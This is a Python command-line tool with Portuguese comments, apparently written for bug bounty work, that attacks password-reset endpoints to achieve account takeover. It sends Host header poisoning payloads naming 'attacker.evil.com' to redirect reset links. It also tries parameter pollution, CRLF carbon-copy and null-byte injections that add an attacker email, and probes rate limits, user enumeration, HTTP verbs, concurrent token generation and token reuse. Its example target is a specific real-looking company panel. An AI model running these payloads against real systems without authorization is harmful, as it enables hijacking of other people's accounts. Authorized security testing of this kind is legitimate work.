#!/usr/bin/env python3
"""
reset_tester.py — Password Reset Security Tester
Foco: Account Takeover via Password Reset
Uso autorizado em bug bounty / pentest com permissão explícita.

Uso:
  python3 reset_tester.py --url URL --data "email=you@you.com" [--tests all]
  python3 reset_tester.py --url URL --data "email=you@you.com&user=you" --tests rate,host,pollution
  python3 reset_tester.py --url URL --data "email=you@you.com" --token-url URL_DO_RESET --tests token

Testes disponíveis:
  rate        → Rate limit / User enumeration
  host        → Host Header Poisoning
  pollution   → Parameter Pollution (email, carbon copy, null byte, case, wildcard)
  token       → Token entropy, reuse, expiry, concurrent
  verb        → HTTP Verb Tampering
  all         → Todos os testes
"""

import argparse
import sys
import time
import string
import random
import threading
import math
from datetime import datetime
from urllib.parse import urlencode, parse_qs

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("[!] requests não instalado. Execute: pip3 install requests")
    sys.exit(1)

# ─────────────────────────────────────────────
# Cores
# ─────────────────────────────────────────────
R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
B = "\033[94m"
C = "\033[96m"
W = "\033[0m"
BOLD = "\033[1m"

def banner():
    print(f"""{C}
  ██████╗ ███████╗███████╗███████╗████████╗
  ██╔══██╗██╔════╝██╔════╝██╔════╝╚══██╔══╝
  ██████╔╝█████╗  ███████╗█████╗     ██║   
  ██╔══██╗██╔══╝  ╚════██║██╔══╝     ██║   
  ██║  ██║███████╗███████║███████╗   ██║   
  ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝   ╚═╝   
  Password Reset Security Tester — Bug Bounty Edition
{W}""")

def log_finding(title, detail, severity="MEDIUM"):
    colors = {"HIGH": R, "MEDIUM": Y, "LOW": B, "INFO": C}
    c = colors.get(severity, W)
    print(f"\n{c}{BOLD}[{severity}] {title}{W}")
    print(f"  {detail}")

def log_info(msg):
    print(f"{B}[*]{W} {msg}")

def log_ok(msg):
    print(f"{G}[+]{W} {msg}")

def log_fail(msg):
    print(f"{R}[-]{W} {msg}")

def log_warn(msg):
    print(f"{Y}[!]{W} {msg}")

# ─────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────
def parse_data(data_str):
    """Converte 'email=a@b.com&user=x' em dict"""
    result = {}
    for pair in data_str.split("&"):
        if "=" in pair:
            k, v = pair.split("=", 1)
            result[k.strip()] = v.strip()
    return result

def send_request(url, data, headers=None, method="POST", verify=False, timeout=10):
    """Envia requisição tentando form-urlencoded e JSON"""
    base_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json, text/plain, */*",
    }
    if headers:
        base_headers.update(headers)

    results = {}

    # Tenta form-urlencoded
    try:
        h = {**base_headers, "Content-Type": "application/x-www-form-urlencoded"}
        if method == "POST":
            r = requests.post(url, data=data, headers=h, verify=verify, timeout=timeout, allow_redirects=False)
        else:
            r = requests.request(method, url, data=data, headers=h, verify=verify, timeout=timeout, allow_redirects=False)
        results["form"] = r
    except Exception as e:
        results["form"] = None

    # Tenta JSON
    try:
        h = {**base_headers, "Content-Type": "application/json"}
        if method == "POST":
            r = requests.post(url, json=data, headers=h, verify=verify, timeout=timeout, allow_redirects=False)
        else:
            r = requests.request(method, url, json=data, headers=h, verify=verify, timeout=timeout, allow_redirects=False)
        results["json"] = r
    except Exception as e:
        results["json"] = None

    return results

def best_response(results):
    """Retorna a melhor resposta (menor status code de erro)"""
    for key in ["form", "json"]:
        r = results.get(key)
        if r and r.status_code < 500:
            return r, key
    for key in ["form", "json"]:
        r = results.get(key)
        if r:
            return r, key
    return None, None

# ─────────────────────────────────────────────
# Testes
# ─────────────────────────────────────────────

def test_rate_limit(url, data, rounds=20):
    """Testa rate limit e user enumeration"""
    print(f"\n{BOLD}{'─'*50}{W}")
    print(f"{BOLD}[TEST] Rate Limit & User Enumeration{W}")
    print(f"{'─'*50}")

    statuses = []
    blocked_at = None

    for i in range(1, rounds + 1):
        results = send_request(url, data)
        r, ctype = best_response(results)
        if not r:
            log_fail(f"Request {i}: sem resposta")
            continue

        statuses.append(r.status_code)
        body_lower = r.text.lower()

        is_blocked = (
            r.status_code in [429, 403, 503] or
            any(k in body_lower for k in ["rate limit", "too many", "bloqueado", "blocked", "limite"])
        )

        if is_blocked and not blocked_at:
            blocked_at = i
            log_ok(f"Request {i}: {r.status_code} — RATE LIMIT detectado!")
        else:
            status_icon = G if r.status_code == 200 else Y
            print(f"  {status_icon}[{i:02d}]{W} {r.status_code} | {len(r.text)}b | {ctype}")

        time.sleep(0.1)

    if not blocked_at:
        log_finding(
            "Sem Rate Limit detectado",
            f"{rounds} requests enviadas sem bloqueio — endpoint não protege contra automação.",
            "HIGH"
        )
    else:
        log_ok(f"Rate limit ativo após {blocked_at} requests.")

    # User enumeration
    print(f"\n{B}[*]{W} Testando user enumeration...")
    fake_data = {**data}
    email_key = next((k for k in data if "email" in k.lower()), None)
    if email_key:
        fake_data[email_key] = f"naoexiste_{random.randint(1000,9999)}@dominiofake12345.com"
        r_valid, _ = best_response(send_request(url, data))
        r_fake, _ = best_response(send_request(url, fake_data))

        if r_valid and r_fake:
            if r_valid.status_code != r_fake.status_code:
                log_finding(
                    "User Enumeration via Status Code",
                    f"Email válido: {r_valid.status_code} | Email inválido: {r_fake.status_code}",
                    "MEDIUM"
                )
            elif len(r_valid.text) != len(r_fake.text):
                log_finding(
                    "User Enumeration via Response Size",
                    f"Email válido: {len(r_valid.text)}b | Email inválido: {len(r_fake.text)}b",
                    "MEDIUM"
                )
            else:
                log_ok("Sem user enumeration detectado via status/size.")


def test_host_header(url, data):
    """Testa Host Header Poisoning"""
    print(f"\n{BOLD}{'─'*50}{W}")
    print(f"{BOLD}[TEST] Host Header Poisoning{W}")
    print(f"{'─'*50}")

    attacker_domain = "attacker.evil.com"
    payloads = [
        {"Host": attacker_domain},
        {"Host": attacker_domain, "X-Forwarded-Host": attacker_domain},
        {"X-Forwarded-Host": attacker_domain},
        {"X-Host": attacker_domain},
        {"X-Forwarded-Server": attacker_domain},
        {"X-HTTP-Host-Override": attacker_domain},
        {"Forwarded": f"host={attacker_domain}"},
    ]

    log_info(f"Testando {len(payloads)} variações de Host Header...")
    log_warn("Verifique o email recebido — se o link contiver 'attacker.evil.com' → CONFIRMADO")

    for i, headers in enumerate(payloads, 1):
        results = send_request(url, data, headers=headers)
        r, ctype = best_response(results)
        if r:
            header_used = list(headers.keys())[0]
            print(f"  [{i}] {header_used}: {r.status_code} | {len(r.text)}b")
        time.sleep(0.3)

    log_finding(
        "Host Header Poisoning — verificação manual necessária",
        f"Enviado com Host: {attacker_domain}. Verifique se o link de reset no email contém esse domínio.",
        "HIGH"
    )


def test_parameter_pollution(url, data):
    """Testa parameter pollution, carbon copy, null byte, case, wildcard"""
    print(f"\n{BOLD}{'─'*50}{W}")
    print(f"{BOLD}[TEST] Parameter Pollution & Email Manipulation{W}")
    print(f"{'─'*50}")

    email_key = next((k for k in data if "email" in k.lower()), None)
    if not email_key:
        log_warn("Nenhum campo 'email' encontrado nos dados. Pulando.")
        return

    victim_email = data[email_key]
    attacker_email = f"attacker_{random.randint(1000,9999)}@attacker.com"

    tests = [
        ("Duplicate param", f"{email_key}={victim_email}&{email_key}={attacker_email}"),
        ("Carbon Copy CRLF", {email_key: f"{victim_email}%0Acc:{attacker_email}"}),
        ("Carbon Copy newline", {email_key: f"{victim_email}\ncc:{attacker_email}"}),
        ("Null byte", {email_key: f"{victim_email}%00{attacker_email}"}),
        ("Null byte @", {email_key: f"{victim_email}%00@{attacker_email}"}),
        ("Case variation", {email_key: victim_email.upper()}),
        ("Plus alias", {email_key: victim_email.replace("@", f"+bounty{random.randint(100,999)}@")}),
        ("Space before", {email_key: f" {victim_email}"}),
        ("JSON array", {email_key: [victim_email, attacker_email]}),
        ("Comma separated", {email_key: f"{victim_email},{attacker_email}"}),
        ("Semicolon separated", {email_key: f"{victim_email};{attacker_email}"}),
    ]

    for name, payload in tests:
        try:
            if isinstance(payload, str):
                # Raw string — envia como form data bruto
                from requests import Session
                s = Session()
                r = s.post(url, data=payload,
                          headers={"Content-Type": "application/x-www-form-urlencoded",
                                   "User-Agent": "Mozilla/5.0"},
                          verify=False, timeout=10, allow_redirects=False)
            else:
                results = send_request(url, payload)
                r, _ = best_response(results)

            if r:
                body_lower = r.text.lower()
                success = r.status_code == 200 and any(
                    k in body_lower for k in ["success", "sent", "enviado", "ok", "true"]
                )
                icon = G if success else Y
                print(f"  {icon}[{name}]{W} {r.status_code} | {len(r.text)}b {'← ACEITO!' if success else ''}")
        except Exception as e:
            print(f"  {R}[{name}]{W} Erro: {e}")
        time.sleep(0.2)

    log_warn("Verifique emails recebidos — qualquer email em attacker@attacker.com indica achado!")


def test_verb_tampering(url, data):
    """Testa HTTP verb tampering"""
    print(f"\n{BOLD}{'─'*50}{W}")
    print(f"{BOLD}[TEST] HTTP Verb Tampering{W}")
    print(f"{'─'*50}")

    verbs = ["GET", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"]

    baseline, _ = best_response(send_request(url, data, method="POST"))
    if baseline:
        log_info(f"Baseline POST: {baseline.status_code} | {len(baseline.text)}b")

    for verb in verbs:
        results = send_request(url, data, method=verb)
        r, ctype = best_response(results)
        if r:
            diff = "← mesmo comportamento!" if (baseline and r.status_code == baseline.status_code) else ""
            print(f"  [{verb}] {r.status_code} | {len(r.text)}b {diff}")
        time.sleep(0.2)


def test_token_analysis(url, data, token_url=None, rounds=5):
    """Testa token entropy, reuse e expiry"""
    print(f"\n{BOLD}{'─'*50}{W}")
    print(f"{BOLD}[TEST] Token Analysis{W}")
    print(f"{'─'*50}")

    if not token_url:
        log_warn("--token-url não fornecido. Análise de token requer URL de reset recebida por email.")
        log_info("Exemplo: --token-url 'https://painel.gocache.com.br/password-reset/TOKEN'")
        return

    tokens = []
    log_info(f"Gerando {rounds} tokens via reset request...")

    for i in range(rounds):
        results = send_request(url, data)
        r, _ = best_response(results)
        if r and r.status_code == 200:
            print(f"  [Request {i+1}] {r.status_code} — aguardando token no email...")
        time.sleep(1)

    log_warn("Tokens precisam ser coletados manualmente do email.")
    log_info("Cole os tokens abaixo (um por linha, Enter em branco para finalizar):")

    while True:
        token = input("  Token: ").strip()
        if not token:
            break
        tokens.append(token)

    if len(tokens) < 2:
        log_warn("Menos de 2 tokens coletados — análise de entropy limitada.")
        return

    # Análise de entropy
    print(f"\n{B}[*]{W} Analisando {len(tokens)} tokens...")
    for i, t in enumerate(tokens):
        charset = 0
        if any(c.isdigit() for c in t): charset += 10
        if any(c.islower() for c in t): charset += 26
        if any(c.isupper() for c in t): charset += 26
        entropy = len(t) * math.log2(charset) if charset else 0
        print(f"  [{i+1}] {t} | len={len(t)} | entropy≈{entropy:.1f} bits")

    # Verificar padrão
    if len(set(len(t) for t in tokens)) == 1:
        log_info(f"Todos os tokens têm o mesmo tamanho: {len(tokens[0])} chars")

    # Teste de reuse
    print(f"\n{B}[*]{W} Testando reuse do primeiro token...")
    test_token_url = token_url.replace("TOKEN", tokens[0]) if "TOKEN" in token_url else token_url
    try:
        r1 = requests.get(test_token_url, verify=False, timeout=10, allow_redirects=False)
        time.sleep(2)
        r2 = requests.get(test_token_url, verify=False, timeout=10, allow_redirects=False)

        if r1.status_code == r2.status_code == 200:
            log_finding(
                "Token Reuse — mesmo token válido em múltiplas requests",
                f"Token ainda válido na 2ª request: {r2.status_code}",
                "HIGH"
            )
        else:
            log_ok(f"Token invalidado após uso: 1ª={r1.status_code} 2ª={r2.status_code}")
    except Exception as e:
        log_fail(f"Erro ao testar reuse: {e}")


def test_concurrent_tokens(url, data, threads=5):
    """Testa geração concorrente de tokens"""
    print(f"\n{BOLD}{'─'*50}{W}")
    print(f"{BOLD}[TEST] Concurrent Token Generation{W}")
    print(f"{'─'*50}")

    log_info(f"Enviando {threads} requests simultâneas...")
    responses = []
    lock = threading.Lock()

    def worker():
        results = send_request(url, data)
        r, ctype = best_response(results)
        if r:
            with lock:
                responses.append((r.status_code, len(r.text), ctype))

    thread_list = [threading.Thread(target=worker) for _ in range(threads)]
    for t in thread_list: t.start()
    for t in thread_list: t.join()

    for i, (status, size, ctype) in enumerate(responses):
        print(f"  [Thread {i+1}] {status} | {size}b | {ctype}")

    if len(responses) == threads:
        log_finding(
            "Concurrent Reset Requests aceitas",
            f"{threads} requests simultâneas processadas — pode gerar múltiplos tokens válidos.",
            "MEDIUM"
        )


# ─────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────
def main():
    banner()

    parser = argparse.ArgumentParser(
        description="Password Reset Security Tester — Bug Bounty Edition"
    )
    parser.add_argument("--url", required=True, help="URL do endpoint de reset")
    parser.add_argument("--data", required=True, help="Dados POST: 'email=a@b.com' ou 'email=a@b.com&user=x'")
    parser.add_argument("--token-url", help="URL de reset recebida por email (ex: .../password-reset/TOKEN)")
    parser.add_argument("--tests", default="all",
                        help="Testes: all, rate, host, pollution, token, verb, concurrent (separados por vírgula)")
    parser.add_argument("--rate-rounds", type=int, default=20, help="Número de requests no teste de rate limit")
    parser.add_argument("--threads", type=int, default=5, help="Threads para teste concorrente")

    args = parser.parse_args()

    data = parse_data(args.data)
    selected = [t.strip().lower() for t in args.tests.split(",")]
    run_all = "all" in selected

    print(f"{B}[*]{W} URL: {args.url}")
    print(f"{B}[*]{W} Data: {data}")
    print(f"{B}[*]{W} Testes: {args.tests}")
    print(f"{B}[*]{W} Início: {datetime.now().strftime('%H:%M:%S')}")

    if run_all or "rate" in selected:
        test_rate_limit(args.url, data, rounds=args.rate_rounds)

    if run_all or "host" in selected:
        test_host_header(args.url, data)

    if run_all or "pollution" in selected:
        test_parameter_pollution(args.url, data)

    if run_all or "verb" in selected:
        test_verb_tampering(args.url, data)

    if run_all or "concurrent" in selected:
        test_concurrent_tokens(args.url, data, threads=args.threads)

    if run_all or "token" in selected:
        test_token_analysis(args.url, data, token_url=args.token_url)

    print(f"\n{G}{BOLD}{'═'*50}{W}")
    print(f"{G}{BOLD}  Análise concluída — {datetime.now().strftime('%H:%M:%S')}{W}")
    print(f"{G}{BOLD}{'═'*50}{W}\n")


if __name__ == "__main__":
    main()
